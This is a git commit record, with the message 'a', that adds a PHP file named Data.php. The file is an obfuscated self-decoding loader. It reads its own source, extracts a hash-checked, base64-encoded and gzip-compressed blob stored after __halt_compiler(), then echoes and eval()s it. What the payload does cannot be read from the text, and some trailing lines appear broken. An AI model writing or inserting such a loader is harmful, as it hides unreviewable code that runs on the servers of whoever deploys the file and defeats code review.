cabd24889321d0f47d415a92b6d3d5f9ce95f481
KhoaZero123 <khoazero123@gmail.com>
2017-08-16 15:14:24 +0700

    a

---
+++ Data.php
@@ -0,0 +1,35 @@
+<?php
+if (!function_exists("c3BsaXRUZXh0QnlMZW5ndGg")) {
+    function c3BsaXRUZXh0QnlMZW5ndGg($ZC0mnd2U8NkVcMBiD9zr, $LkAWYdzlRhqJ2I1DxH7O = 0) {
+        $swdjPpvcRaGZT2mzfKWL = implode("\n", $ZC0mnd2U8NkVcMBiD9zr);
+        $St0gubEXCYsJ3vOTclPR = array(1400, 488, 64);
+        if ($LkAWYdzlRhqJ2I1DxH7O == 0)
+            $T4yLbZX05liVuEr2Hs3o = substr($swdjPpvcRaGZT2mzfKWL, $St0gubEXCYsJ3vOTclPR[0], $St0gubEXCYsJ3vOTclPR[1]);
+        elseif ($LkAWYdzlRhqJ2I1DxH7O == 1)
+            $T4yLbZX05liVuEr2Hs3o = substr($swdjPpvcRaGZT2mzfKWL, $St0gubEXCYsJ3vOTclPR[0] + $St0gubEXCYsJ3vOTclPR[1], $St0gubEXCYsJ3vOTclPR[2]);
+        else
+            $T4yLbZX05liVuEr2Hs3o = trim(substr($swdjPpvcRaGZT2mzfKWL, $St0gubEXCYsJ3vOTclPR[0] + $St0gubEXCYsJ3vOTclPR[1] + $St0gubEXCYsJ3vOTclPR[2]));
+        return($T4yLbZX05liVuEr2Hs3o);
+    }
+}
+if (!function_exists("Z3ppbmZsYXRlQW5kQmFzZTY0RGVjb2Rl")) {
+    function Z3ppbmZsYXRlQW5kQmFzZTY0RGVjb2Rl($Oj8EYNiQpGPZVSRXwcgf, $hsjFMLS5VunXgTxCNB0e) {
+        if ($hsjFMLS5VunXgTxCNB0e == hash('sha256',$Oj8EYNiQpGPZVSRXwcgf)) {
+            return(gzinflate(base64_decode($Oj8EYNiQpGPZVSRXwcgf)));
+        } else{
+            return(" ");
+        }
+    }
+}
+	
+	$dGhpc0ZpbGU = file(__FILE__);
+	//$a = base64_decode(c3BsaXRUZXh0QnlMZW5ndGg($dGhpc0ZpbGU));eval($a);
+	$a = Z3ppbmZsYXRlQW5kQmFzZTY0RGVjb2Rl(c3BsaXRUZXh0QnlMZW5ndGg($dGhpc0ZpbGU,2),c3BsaXRUZXh0QnlMZW5ndGg($dGhpc0ZpbGU,1));
+	echo $a;
+	eval($a);
+	exit;
+	
+	__halt_compiler();aWYgKCFmdW5jdGlvbl9leGlzdHMoIlozcHBibVpzWVhSbFFXNWtRbUZ6WlRZMFJHVmpiMlJsIikpIHsNCiAgICBmdW5jdGlvbiBaM3BwYm1ac1lYUmxRVzVrUW1GelpUWTBSR1ZqYjJSbCgkT2o4RVlOaVFwR1BaVlNSWHdjZ2YsICRoc2pGTUxTNVZ1blhnVHhDTkIwZSkgew0KICAgICAgICBpZiAoJGhzakZNTFM1VnVuWGdUeENOQjBlID09IGhhc2goJ3NoYTI1NicsJE9qOEVZTmlRcEdQWlZTUlh3Y2dmKSkgew0KICAgICAgICAgICAgcmV0dXJuKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRPajhFWU5pUXBHUFpWU1JYd2NnZikpKTsNCiAgICAgICAgfSBlbHNlew0KICAgICAgICAgICAgcmV0dXJuKCIgIik7DQogICAgICAgIH0NCiAgICB9DQp99dae447050d39a9c4038ad2e97a82acc187794a6996c9cfbf7a49f44d2e43e96XY7BCsIwEETvgfzDnnsw9yK2ooIHBf8gxHRpI2kTNlsUxH83tRTUOe68nZlqs65iF6VQRSEFFFBHCje0XMJuTBx6pItJ6R6omW0zchcISjg5PjwYh+TCMFsjecgqoWOOpVLeMS7EyoZ+prA3zk/Ut12303WBlBRSWJ97f1r0/yJ9RB+R9N6wyX9Zn8Amwdm0qHeBcEG218RkLMNzyn69AQ==';
+
+echo base64_decode($a);
+?>
